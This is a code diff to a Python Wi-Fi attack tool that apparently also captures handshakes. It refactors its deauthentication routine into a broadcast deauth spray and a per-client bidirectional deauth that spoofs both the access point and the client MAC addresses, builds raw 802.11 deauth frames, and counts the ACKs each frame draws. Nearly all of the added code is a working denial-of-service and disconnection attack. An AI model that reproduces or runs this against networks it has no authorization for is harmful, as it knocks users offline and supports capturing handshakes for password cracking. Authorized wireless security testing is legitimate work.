@@ -3,6 +3,7 @@ from parsed RX frames, drives channel hopping, and injects raw frames via a chip
 import asyncio
 import logging
 import time
+from dataclasses import dataclass
 from typing import List, Optional, Callable, Any, Dict, Set
 
 from wifit3.engine.models import AccessPoint, Client, Handshake, HandshakeMessage
@@ -86,6 +87,30 @@ def _deauth_nav_bytes(dest_mac: str) -> bytes:
     TX, not ``IEEE80211_TX_CTL_INJECTED`` frames), so we set it in the frame ourselves."""
     nav = 0 if _is_group_mac(dest_mac) else _DEAUTH_ACK_NAV_US
     return nav.to_bytes(2, "little")
+
+
+@dataclass
+class DeauthResult:
+    """Per-direction TX-ACK tally for a client-directed de-auth (see ``deauth_client``).
+
+    ``client_acks``/``client_sent`` — AP→Client frames the CLIENT ACKed (each ACK's RA is
+    the AP MAC we spoofed as the sender). ``ap_acks``/``ap_sent`` — Client→AP frames the AP
+    ACKed (RA = the client MAC we spoofed). ``measured`` is False when the driver has no
+    TX-ACK detection: the counts are then 0 and the caller reports only frames sent, no ACK
+    verdict (a broadcast de-auth is never measured — group frames aren't ACKed)."""
+    client_acks: int = 0
+    client_sent: int = 0
+    ap_acks: int = 0
+    ap_sent: int = 0
+    measured: bool = False
+
+    @property
+    def total_acked(self) -> int:
+        return self.client_acks + self.ap_acks
+
+    @property
+    def total_sent(self) -> int:
+        return self.client_sent + self.ap_sent
 
 
 def _fmt_frame(tag: str, ftype: str, src, dest, bssid) -> str:
@@ -665,42 +690,86 @@ class WlanInterface:
         except Exception:
             pass
 
-    async def deauth(self, ap_bssid: str, client_bssid: str, burst_count: int = 10):
-        """Inject a burst of deauth frames spoofing both directions (AP→client and client→AP)."""
+    def _deauth_channel(self, ap_bssid: str) -> int:
+        """The AP's known channel (for the log line); the current channel if it's unseen.
+        Parity with the historic deauth path — the radio is expected to already be parked
+        on the target channel; this doesn't re-tune."""
+        if ap_bssid in self.access_points:
+            return self.access_points[ap_bssid].channel
+        logger.debug("[DEAUTH] %s not in registry; deauthing on current channel %d",
+                     ap_bssid, self.current_channel)
+        return self.current_channel
+
+    def _deauth_frame(self, dest: bytes, src: bytes, ap_mac: bytes, dest_str: str) -> bytes:
+        """One 802.11 deauth MPDU (no FCS): FC 0xC0 (Deauth/Mgmt), reason 7 (class-3 frame
+        from a nonassociated STA). Addr1=dest, Addr2=src, Addr3=BSSID(AP). Duration/NAV is
+        keyed on the destination: unicast → the ACK NAV, group → 0 (see _deauth_nav_bytes).
+        The sequence number (0) is overwritten by the hardware."""
+        return (b"\xc0\x00" + _deauth_nav_bytes(dest_str) + dest + src + ap_mac
+                + b"\x00\x00" + b"\x07\x00")
+
+    async def deauth_broadcast(self, ap_bssid: str, count: int = 20) -> int:
+        """Spray AP→broadcast de-auth frames — one wave hits every associated station at once.
+
+        Group-addressed (addr1 = ff:ff:ff:ff:ff:ff), so no station ever ACKs it: this is
+        fire-and-forget with no possible delivery confirmation — the nature of broadcast.
+        One direction only; a reverse broadcast→AP frame de-auths nobody. Returns the count
+        of frames sent."""
+        ap_bssid = ap_bssid.lower()
+        target_chan = self._deauth_channel(ap_bssid)
+        ap_mac = self._to_mac_bytes(ap_bssid)
+        bcast = b"\xff\xff\xff\xff\xff\xff"
+        frame = self._deauth_frame(bcast, ap_mac, ap_mac, "ff:ff:ff:ff:ff:ff")
+        logger.info("Injecting broadcast de-auth (%dx) on CH %d from %s", count, target_chan, ap_bssid)
+        for _ in range(count):
+            await self.send_raw(frame, use_no_ack=True)
+            await asyncio.sleep(0.01)
+        return count
+
+    async def deauth_client(self, ap_bssid: str, client_bssid: str, rounds: int = 10,
+                            ack_window: float = 0.05) -> DeauthResult:
+        """De-auth one client both ways, measuring how many frames each endpoint ACKed.
+
+        AP→Client frames are ACKed by the CLIENT (the ACK's RA is the AP MAC we spoofed as
+        sender); Client→AP frames are ACKed by the AP (RA = the client MAC we spoofed). With
+        a driver that has TX-ACK detection we arm it, send each frame ACK-gated within
+        ``ack_window`` s, and tally the per-direction landings — no resends, so exactly
+        ``2*rounds`` frames still go out. Without it we still send, but the result is
+        ``measured=False`` and the caller reports no ACK verdict.
+
+        use_no_ack: we spoof the source, so any hardware ACK-retry would target the real
+        endpoints — the TX-ACK detection reads the ACK off the monitor RX instead."""
         ap_bssid = ap_bssid.lower()
         client_bssid = client_bssid.lower()
-
-        target_chan = self.current_channel
-        if ap_bssid in self.access_points:
-            target_chan = self.access_points[ap_bssid].channel
-        else:
-            logger.debug("[DEAUTH] %s not in registry; deauthing on current channel %d",
-                         ap_bssid, target_chan)
-
+        target_chan = self._deauth_channel(ap_bssid)
         ap_mac = self._to_mac_bytes(ap_bssid)
         cl_mac = self._to_mac_bytes(client_bssid)
+        client_deauth = self._deauth_frame(cl_mac, ap_mac, ap_mac, client_bssid)   # AP→Client
+        ap_deauth = self._deauth_frame(ap_mac, cl_mac, ap_mac, ap_bssid)           # Client→AP
+        logger.info("Injecting client de-auth (%dx pairs) on CH %d: %s <-> %s",
+                    rounds, target_chan, ap_bssid, client_bssid)
 
-        # Frame Control: 0xC0 (Deauth, Mgmt), Flags: 0x00.
-        # Reason Code 7 (class-3 frame from nonassociated STA), little-endian u16.
-        fc = b"\xc0\x00"
-        reason = b"\x07\x00"
-        seq = b"\x00\x00"  # hardware overwrites the sequence number
-
-        # Client deauth spoofs the AP as source; AP deauth spoofs the client.
-        # Addr1=Dest, Addr2=Source, Addr3=BSSID(AP) in both. Duration/NAV is keyed on the
-        # destination (addr1): unicast → the ACK NAV, broadcast → 0. See _deauth_nav_bytes.
-        client_deauth = fc + _deauth_nav_bytes(client_bssid) + cl_mac + ap_mac + ap_mac + seq + reason
-        ap_deauth = fc + _deauth_nav_bytes(ap_bssid) + ap_mac + cl_mac + ap_mac + seq + reason
-
-        logger.info(f"Injecting Deauth Burst ({burst_count}x) on CH {target_chan}: "
-                    f"{ap_bssid} <-> {client_bssid}")
-
-        # use_no_ack: we're spoofing, so ACKs would go to the real targets and trigger
-        # endless hardware retries.
-        for _ in range(burst_count):
-            await self.send_raw(client_deauth, use_no_ack=True)
-            await self.send_raw(ap_deauth, use_no_ack=True)
-            await asyncio.sleep(0.01)
+        driver = self.driver
+        measure = all(hasattr(driver, n) for n in ("enable_ack_detect", "disable_ack_detect"))
+        res = DeauthResult(measured=measure)
+        if measure:
+            await driver.enable_ack_detect()
+        try:
+            w = ack_window if measure else 0.0
+            for _ in range(rounds):
+                landed_c = await self.send_raw(client_deauth, use_no_ack=True, wait_for_ack=w)
+                res.client_sent += 1
+                if measure and landed_c:
+                    res.client_acks += 1
+                landed_a = await self.send_raw(ap_deauth, use_no_ack=True, wait_for_ack=w)
+                res.ap_sent += 1
+                if measure and landed_a:
+                    res.ap_acks += 1
+                await asyncio.sleep(0.01)
+        finally:
+            if measure:
+                await driver.disable_ack_detect()
+        return res
 
 
     async def start_hopping(self, channels: List[int] = None, interval: float = 0.5):
